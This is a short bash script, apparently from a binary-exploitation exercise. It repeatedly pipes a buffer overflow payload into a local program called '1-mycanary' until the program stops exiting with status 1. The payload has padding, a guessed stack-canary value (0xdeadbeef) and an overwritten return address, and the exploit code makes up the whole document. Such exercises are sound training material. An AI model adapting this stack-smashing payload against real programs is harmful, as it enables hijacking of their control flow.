#!/bin/bash

res=1;

while [[ $res == 1 ]]; do
	python -c 'print "A" * 100 + "\xef\xbe\xad\xde" + "A" * 12 + "\xc4\x85\x04\x08"' | ./1-mycanary ; res=$?
done

echo "DONE!"